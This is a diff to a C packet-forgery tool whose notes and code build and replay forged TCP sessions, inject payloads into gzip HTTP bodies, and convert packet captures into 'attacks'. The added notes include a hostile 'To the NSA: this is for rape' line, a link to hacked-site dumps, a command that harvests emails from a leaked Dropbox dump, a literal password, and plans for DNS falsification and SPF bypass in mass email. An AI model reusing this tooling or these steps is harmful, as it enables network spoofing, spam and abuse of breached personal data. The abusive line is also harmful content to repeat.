@@ -2,6 +2,7 @@
 A lot of random notes here from various different moments.. Just skip down to the code below it, or don't think too far
 into routines which are either already coded, or changed..
 
+To the NSA: this is for rape.
 
 11/10 -
 Starting doing some testing/developing on VMware rather than WSL (Ubuntu on Windows 10)
@@ -81,6 +82,20 @@ surveillance platforms.  It works on every platform which uses the 'illegal fibe
 lists of terrorists worldwide from the past 30 years, and chain tens of millions of people to them.  These mass
 surveillance platforms are vulnerable in design.
 
+--
+Leaks from hacked sites: (where i found 950mil email addresses)
+https://hacksoc.co.uk/other/dumps
+using torrent..
+dropbox.. cat *.txt|cut -d: -f1 > dropbox_emails
+myspace password: KLub8pT&iU$8oBY(*$NOiu
+
+need to compreess email addresses - find top domains.. and make a list of the users under them and put into a list like that
+
+need UDP support for falsifying DNS, and RTSP (sip vvoice)
+
+CC and BCC are good options because later if they beginn getting better.. itll allow resaons for them to process emails even if it doesnt come from SPF dommains (or domains usually with encrypted email)
+SPF can be bypassed pretty easisly due to how thi works but it also means that on some networks it might not go through correctly
+--
 
 
 E-Mail is another story.  Each protocol online which is used by the majority of populations are going to be
@@ -653,24 +668,34 @@ void PacketAdjustments(AS_attacks *aptr) {
             // The header identifier is changed here (and we are using the client side)
             buildptr->header_identifier = client_identifier++;
 
+            printf("C original seq: %X\n", buildptr->seq);
             // replace tcp/ip ack/seq w new base
             client_seq_diff = buildptr->seq - aptr->client_base_seq;
             buildptr->seq = client_new_seq + client_seq_diff;
 
+            printf("C new seq: %X\n", buildptr->seq);
+
+            printf("C original ack: %X\n", buildptr->ack);
             server_seq_diff = buildptr->ack - aptr->server_base_seq;
             buildptr->ack = server_new_seq + server_seq_diff;
+            printf("C new ack: %X\n", buildptr->ack);
 
         } else  {
+            printf("0-00000-- NON CLIENT\n");
             // Source port from server to client is changed here
             buildptr->destination_port = client_port;
             // The header identifier is changed here (and we use the server side)
             buildptr->header_identifier = server_identifier++;
 
+            printf("S original seq: %X\n", buildptr->seq);
             server_seq_diff = buildptr->seq - aptr->server_base_seq;
             buildptr->seq = server_new_seq + server_seq_diff;
+            printf("S new seq: %X\n", buildptr->seq);
 
+            printf("S original ack: %X\n", buildptr->ack);
             client_seq_diff = buildptr->ack - aptr->client_base_seq;
             buildptr->ack = client_new_seq + client_seq_diff;
+            printf("S original ack: %X\n", buildptr->ack);
         }
 
         // move to the next packet
@@ -1960,9 +1985,8 @@ int GZipAttack(AS_attacks *aptr, int *size, char **server_body) {
     outstream.opaque = Z_NULL;
 
     // execute proper zlib functions for compression (to insert our attacks)
-    if (deflateInit2(&outstream, Z_DEFAULT_COMPRESSION, Z_DEFLATED, 15|16, 8, Z_DEFAULT_STRATEGY) != Z_OK) {
+    if (deflateInit2(&outstream, Z_DEFAULT_COMPRESSION, Z_DEFLATED, 15|16, 8, Z_DEFAULT_STRATEGY) != Z_OK)
         goto end;
-    }
 
     // loop through the entire body finding the locations of where the injections should take place
     sptr = data;
@@ -2403,6 +2427,8 @@ int main(int argc, char *argv[]) {
     int i = 0, r = 0;
     int start_ts = time(0);
     FILE *fd;
+    char *filename = NULL;
+    AS_attacks *aptr = NULL;
 #ifdef BIG_TEST
     int repeat = 1000000;
 #endif
@@ -2411,6 +2437,10 @@ int main(int argc, char *argv[]) {
         printf("%s ipv4_client_ip client_port ipv4_server_ip server_port client_body_file server_body_file repeat_count repeat_interval\n",
             argv[0]);
         exit(-1);
+    } else if (argc == 2) {
+        filename = argv[1];
+        printf("Will load attck from pcap %s\n", filename);
+        
     }
 
     srand(time(0));
@@ -2426,6 +2456,7 @@ int main(int argc, char *argv[]) {
         printf("couldnt start network thread\n");
     }*/
 
+    if (filename == NULL) {
     // client information
     client_ip       = inet_addr(argv[1]);
     client_port     = atoi(argv[2]);
@@ -2466,12 +2497,19 @@ int main(int argc, char *argv[]) {
 
     if (!client_ip || !server_ip || !client_port || !server_port || !G_client_body ||
              !G_server_body || !count || !repeat_interval) goto bad_syntax;
+    } else {
+        //AS_attacks *PCAPtoAttack(char *filename, int dest_port, int count, int interval);
+        aptr = PCAPtoAttack(filename, 80, 999999, 10);
+        printf("APTR from PCAP: %p\n", aptr);
+    }
+
 
 #ifdef BIG_TEST
     while (repeat--) {
         server_ip = rand()%0xFFFFFFFF;
         client_ip = rand()%0xFFFFFFFF;
 #endif
+        if (!filename)
         // Initialize an attack structure regarding passed information
         if ((r = AS_session_queue(1, client_ip, server_ip, client_port, server_port, count, repeat_interval, 1,
                      (void *)&HTTP4_Create)) != 1) {
@@ -2500,7 +2538,7 @@ int main(int argc, char *argv[]) {
     // simultaneously... since this is just a test... let's loop a few times just to be sure.
     for (i = 0; i < 30; i++) {
         r = AS_perform();
-        //if (r != 1)
+        if (r != 1)
             printf("AS_perform() = %d\n", r);
     }
 #endif
@@ -2517,8 +2555,11 @@ int main(int argc, char *argv[]) {
     // This is probably the amount of time it'd dumping to network since its all happening simultaneously
     printf("Time before dumping packets to disk: %d seconds\n", (int)(time(0) - start_ts));
 
+    if (!filename)
     // now lets write to pcap file.. all of those packets.. open up wireshark.
     dump_pcap((char *)"output.pcap", network_queue);
+    else
+    dump_pcap((char *)"output2.pcap", network_queue);
 
     printf("Time to fabricate, and dump packets to disk: %d seconds\n", (int)(time(0) - start_ts));
 
@@ -2545,6 +2586,8 @@ PacketInfo *PcapLoad(char *filename) {
     int pkt_size = 0;
 
     if ((fd = fopen(filename, "rb")) == NULL) goto end;
+
+    if (fread((void *)&hdr,1,sizeof(pcap_hdr_t), fd) != sizeof(pcap_hdr_t)) goto end;
 
     // check a few things w the header to ensure its processable
     if ((hdr.magic_number != 0xa1b2c3d4) || (hdr.network != 1)) goto end;
@@ -2603,12 +2646,17 @@ PacketBuildInstructions *PacketsToInstructions(PacketInfo *packets) {
     struct pseudo_tcp *p_tcp = NULL;
     char *checkbuf = NULL;
     int tcp_header_size = 0;
+    struct in_addr src, dst;
+    char src_ip[16];
+    char dst_ip[16];
 
+    printf("PacketsToInstructions\n");
     pptr = packets;
 
     while (pptr != NULL) {
         // set structure for reading information from this packet
         p = (struct packet *)pptr->buf;
+
         // be sure its ipv4..
         if (p->ip.version == 4) {
             // be sure it is tcp/ip
@@ -2627,6 +2675,14 @@ PacketBuildInstructions *PacketsToInstructions(PacketInfo *packets) {
 
                 if (iptr == NULL) goto end;
 
+                src.s_addr = p->ip.saddr;//iptr->source_ip;
+                memcpy((void *)src_ip, inet_ntoa(src), 16);
+
+                dst.s_addr = p->ip.daddr;//iptr->destination_ip;
+                memcpy((void *)dst_ip, inet_ntoa(dst), 16);
+                                    printf("%s:%d -> %s:%d\n",
+                                    src_ip, iptr->source_port, dst_ip, iptr->destination_port);
+                
                 // start OK.. until checksum.. or disqualify for other reasons
                 iptr->ok = 1;
 
@@ -2640,7 +2696,7 @@ PacketBuildInstructions *PacketsToInstructions(PacketInfo *packets) {
                 if ((data = (char *)malloc(data_size + 1)) == NULL) goto end;
 
                 // pointer to where the data starts in this packet being analyzed
-                sptr = (char *)((pptr->buf + pptr->size) - data_size);
+                sptr = (char *)(pptr->buf + ((p->ip.ihl << 2) + (p->tcp.doff << 2)));
 
                 // copy into the newly allocated buffer the tcp/ip data..
                 memcpy(data, sptr, data_size);
@@ -2722,6 +2778,8 @@ PacketBuildInstructions *PacketsToInstructions(PacketInfo *packets) {
 
     ret = list;
 
+    printf("end count: %d\n", L_count((LINK *)list));
+
     end:;
 
     // if something got us here without ret, and some list.. remove it
@@ -2734,40 +2792,23 @@ PacketBuildInstructions *PacketsToInstructions(PacketInfo *packets) {
 }
 
 
-// types of filtering we can perform..
-// FAMILIAR means it will match client/server sides of the connection
-enum {
-    FILTER_CLIENT_IP=1,
-    FILTER_SERVER_IP=2,
-    FILTER_CLIENT_PORT=4,
-    FILTER_SERVER_PORT=8,
-    FILTER_PACKET_FLAGS=16,
-    FILTER_PACKET_FAMILIAR=32
-};
-
-typedef struct _filter_information {
-    int flags;
-    int packet_flags;
-    uint32_t source_ip;
-    uint32_t destination_ip;
-    uint16_t source_port;
-    uint16_t destination_port;
-    int init;
-} FilterInformation;
 
 void FilterPrepare(FilterInformation *fptr, int type, uint32_t value) {
-    if (fptr->init != 1)
+    if (fptr->init != 1) {
         memset((void *)fptr, 0, sizeof(FilterInformation));
+        fptr->init = 1;
+    }
 
     // does this filter allow looking for specific packet propertieS? like SYN/ACK/PSH/RST
     if (type & FILTER_PACKET_FLAGS) {
-        fptr->flags |= FILTER_PACKET_FLAGS;
+        fptr->flags = FILTER_PACKET_FLAGS;
         fptr->packet_flags = value;
     }
 
     // will it look for both sides of the connection? ie: port 80 would allow stuff from server to client as well
-    if (type & FILTER_PACKET_FAMILIAR)
+    if (type & FILTER_PACKET_FAMILIAR) {
         fptr->flags |= FILTER_PACKET_FAMILIAR;
+    }
 
     // does the IP address match?
     if (type & FILTER_CLIENT_IP) {
@@ -2799,30 +2840,31 @@ int FilterCheck(FilterInformation *fptr, PacketBuildInstructions *iptr) {
     int ret = 0;
 
     // if the filter is empty... its allowed
-    if (fptr->flags == 0) return 1;
+    if (fptr->flags == 0 || fptr->init != 1) return 1;
 
     // verify client IP
     if (fptr->flags & FILTER_CLIENT_IP)
         if (iptr->source_ip != fptr->source_ip)
-            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) || (iptr->source_ip != fptr->destination_ip))
+            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->source_ip != fptr->destination_ip))
                 goto end;
 
     // verify server IP
     if (fptr->flags & FILTER_SERVER_IP)
         if (iptr->destination_ip != fptr->destination_ip)
-            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) || (iptr->destination_ip != fptr->source_ip))
+            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->destination_ip != fptr->source_ip))
                 goto end;
 
     // verify server port (for instance www 80)
     if (fptr->flags & FILTER_SERVER_PORT)
         if (iptr->destination_port != fptr->destination_port)
-            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) || (iptr->destination_port != fptr->source_port))
+            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->destination_port != fptr->source_port)) {
                 goto end;
+            }
     
     // verify client source port
     if (fptr->flags & FILTER_CLIENT_PORT)
         if (iptr->source_port != fptr->source_port)
-            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) || (iptr->destination_port != fptr->source_port))
+            if (!(fptr->flags & FILTER_PACKET_FAMILIAR) && (iptr->destination_port != fptr->source_port))
             goto end;
 
     // looking for a specific type of packet by its flags..
@@ -2864,26 +2906,41 @@ PacketBuildInstructions *InstructionsFindConnection(PacketBuildInstructions **in
     PacketBuildInstructions *packets = NULL;
     PacketBuildInstructions *ret = NULL;
     FilterInformation fptr;
+    int count = 0, ccount = 0, fcount = 0;
+    struct in_addr src, dst;
+    char Asrc_ip[16];
+    char Adst_ip[16];
 
-    if (flt == NULL) {
+    printf("InstructionsFindConnection count: %d\n", L_count((LINK *)iptr));
+
+    if (flt == NULL)
         // default filter is port 80 (www) both sides of the packets...
         FilterPrepare(&fptr, FILTER_SERVER_PORT|FILTER_PACKET_FAMILIAR, 80);
-    } else
-        // copy filter supplied
-        memcpy((void *)&fptr, flt, sizeof(FilterInformation));
+    
 
     // enumerate all instruction packets
     while (iptr != NULL) {
+        count++;
         // make sure it matches our filter (right now hard coded for www)
-        if (FilterCheck(&fptr, iptr)) {
+        if (FilterCheck(flt ? flt : &fptr, iptr)) {
+            fcount++; // filter couont..
+            src.s_addr = iptr->source_ip;
+            memcpy((void *)&Asrc_ip, inet_ntoa(src), 16);
+
+            dst.s_addr = iptr->destination_ip;
+            memcpy((void *)&Adst_ip, inet_ntoa(dst), 16);
+
+            printf("%s:%d -> %s:%d\n", Asrc_ip, iptr->source_port, Adst_ip, iptr->destination_port);
+        
             // ***
             // a SYN packet with an ACK of 0 should be the first connecting packet
             // to start: we wiill support the first TCP/IP connection we grab from the pcap
             // there are numerous utilities to split PCAPs.. Ill come back to this later
             if (!src_ip && !dst_ip && !src_port && !dst_port) {
                 if ((iptr->flags & TCP_FLAG_SYN) && iptr->ack == 0) {
+                    printf("syn w 0 ack\n");
                     // mark this as the client
-                    iptr->client = 1;
+                    //iptr->client = 1;
 
                     // grab the IP addresses, and ports from packet.. we will use as a reference to find the connection
                     src_ip = iptr->source_ip;
@@ -2897,8 +2954,11 @@ PacketBuildInstructions *InstructionsFindConnection(PacketBuildInstructions **in
             if (((src_port == iptr->source_port) && (dst_port == iptr->destination_port)) ||
                 (src_port == iptr->destination_port) && (dst_port == iptr->source_port)) {
                     // if its coming from the source IP we found as an initial SYN.. its the client
-                    iptr->client = (src_ip == iptr->source_ip);
+                    if (iptr->source_port == src_port) {
+                        ccount++;
+                        iptr->client = (iptr->source_port == src_port);
 
+                    }
 
                     // at this rate i can code a mass surveillance system from scratch almost.
                     // go figure.
@@ -2938,6 +2998,7 @@ PacketBuildInstructions *InstructionsFindConnection(PacketBuildInstructions **in
 
                     // time to process the next
                     iptr = inext;
+                    continue;
                 }
             }
 
@@ -2950,6 +3011,9 @@ PacketBuildInstructions *InstructionsFindConnection(PacketBuildInstructions **in
 
     ret = packets;
 
+    printf("-----------------\n");
+    printf("done func %d client couont %d filter count %d\n", count, ccount, fcount);
+    printf("-----------------\n");
     return ret;
 }
 
@@ -2970,9 +3034,10 @@ AS_attacks *InstructionsToAttack(PacketBuildInstructions *instructions, int coun
     PacketBuildInstructions *pptr = NULL;
     int Current_Packet = 0;
     int found_seq = 0;
+    int i = 0;
 
     // ensure that packet array if ZERO for later...
-    memset((void *)&Packets, 0, sizeof(Packets) * 16);
+    memset((void *)&Packets, 0, sizeof(PacketBuildInstructions *) * 16);
 
     // allocate space for this new structure being built
     if ((aptr = (AS_attacks *)calloc(1,sizeof(AS_attacks))) == NULL) goto end;
@@ -2997,7 +3062,7 @@ AS_attacks *InstructionsToAttack(PacketBuildInstructions *instructions, int coun
 
     // we need to find a few things... base server/client seq
     // loop through them if we need something from there..    
-    while (iptr != NULL && !found_start) {
+    while (iptr != NULL) {
 
         if (!found_start) {
             // if its set as a client from the last function which created these structures, and its a SYN packet..
@@ -3020,15 +3085,27 @@ AS_attacks *InstructionsToAttack(PacketBuildInstructions *instructions, int coun
                 // if this is an ACK but not a SYN.. its accepting the connection..
                 // we want to find the other before it!
                 pptr = Packets[(Current_Packet - 1) % 16];
-                // the packet before (SYN packet) should have an ACK of 0 since its new
-                if (pptr->ack == 0) {
-                    // this is the one where we get the clients base seq
-                    aptr->client_base_seq = pptr->seq;
+                // scan at most prior 16 packets looking for ACK/SEQ
+                for (i = 1; i < 15; i++) {
+                    pptr = Packets[(Current_Packet - i) % 16];
+                    if (pptr != NULL) {
+                        // the packet before (SYN packet) should have an ACK of 0 since its new... and it has SYN flag
+                        printf("pptr ack %d\n", pptr->ack);
+                        if (pptr->ack == 0) {//} && (iptr->flags & TCP_FLAG_SYN)) {
 
-                    // and the current packet that we found (ACK'ing the SYN) is the server's base seq.
-                    aptr->server_base_seq = iptr->seq;
+                            printf("Found ack/seq!\n");
+                            // this is the one where we get the clients base seq
+                            aptr->client_base_seq = pptr->seq;
 
-                    found_seq = 1;
+                            // and the current packet that we found (ACK'ing the SYN) is the server's base seq.
+                            aptr->server_base_seq = iptr->ack;
+
+                            printf("Found ack/seq! client %X server %X\n", aptr->client_base_seq, aptr->server_base_seq);
+
+                            found_seq = 1;
+                            break;
+                        }
+                    }
                 }
                 
             }
@@ -3057,10 +3134,7 @@ AS_attacks *InstructionsToAttack(PacketBuildInstructions *instructions, int coun
     // unpause...
     aptr->paused = 0;
     
-    // lets put it in the list..
-    // *** maybe put this in a new list which will only modify attack_list if it can lock mutex
-    aptr->next = attack_list;
-    attack_list = aptr;
+    // the calling function can handle putting it into the actual attack list..
     
     end:;
 
@@ -3102,19 +3176,22 @@ new sites to aattack
 
 // Load a PCAP and call correct functionality to load it as an attack
 AS_attacks *PCAPtoAttack(char *filename, int dest_port, int count, int interval) {
-    PacketInfo *packets = PcapLoad(filename);
+    PacketInfo *packets = NULL;
     PacketBuildInstructions *packetinstructions = NULL;
     PacketBuildInstructions *final_instructions = NULL;
     FilterInformation flt;
     AS_attacks *aptr = NULL;
     AS_attacks *ret = NULL;
 
+    printf("pcap to attack filename: %s\n", filename);
     // load pcap file into packet information structures
     if ((packets = PcapLoad(filename)) == NULL) return NULL;
     
+    printf("Packets: %p\n", packets);
     // turn those packet structures into packet building instructions via analysis, etc
     if ((packetinstructions = PacketsToInstructions(packets)) == NULL) goto end;
     
+    printf("1st instructions: %p\n", packetinstructions);
     // prepare the filter for detination port
     FilterPrepare(&flt, FILTER_PACKET_FAMILIAR|FILTER_SERVER_PORT, dest_port);
     
@@ -3122,13 +3199,23 @@ AS_attacks *PCAPtoAttack(char *filename, int dest_port, int count, int interval)
     // from the connection
     if ((final_instructions = InstructionsFindConnection(&packetinstructions, &flt)) == NULL) goto end;
 
+    printf("filtered instructions: %p\n", final_instructions);
+
     // create the attack structure w the most recent filtered packet building parameters
     if ((aptr = InstructionsToAttack(final_instructions, count, interval)) == NULL) goto end;
+
+    printf("attack structure %p\n", aptr);
 
     // if it all worked out...
     ret = aptr;
 
-end:;
+    // add to the attack list being executed now
+    aptr->next = attack_list;
+    attack_list = aptr;
+
+    printf("perfecto we generated an attack directly from a packet capture..\n");
+
+    end:;
     PacketsFree(&packets);
     PacketBuildInstructionsFree(&packetinstructions);
 
@@ -3137,3 +3224,71 @@ end:;
 
     return ret;
 }
+
+/*
+typedef struct _points { int x; int y; int n} MPoints;
+CPoints[] = {
+    {00,11,1},{01,22,2},{21,31,3},{31,42,4},{41,53,5},{55,54,6},{54,53,7},{05,15,8},{14,22,9},{03,51,10},{24,35,11},{00,00,00}
+};
+
+int pdiff(int x, int y) {
+    int ret = 0;
+    int i = 0, a = 0, z = 0;
+    MPoints points[16];
+
+    while (CPoints[i].n != 0) {
+        points[i].x = CPoints[i].x - x;
+        if (points[i].x < 0) points[i].x ~= points[i].x;
+        points[i].y = CPoints[i].y - y;
+        if (points[i].y < 0) points[i].y ~= points[i].y; 
+
+        i++;
+    }
+
+    for (a = 0; CPoints[a].id != 0; a++) {
+
+    }
+
+    return ret;
+}
+
+[00,11],[01,22],[21,31],[31,42],[41,53],[55,54],[54,53],[05,15],[14,22],[03,51],[24,35],[00,00]
+
+0                       1                                  2                         3                          4                              5
+
+
+
+
+
+
+
+1                     11                                  21                        31                         41                              51
+
+
+
+
+
+
+
+2                      12                                  22                        32                         42                            52
+
+
+
+
+
+
+3                     13                                   23                         33                         43                           53
+
+
+
+
+
+4                      14                                  24                       34                            44                           54
+
+
+
+5                     15                                25                            35                            45                          55
+
+
+
+*/
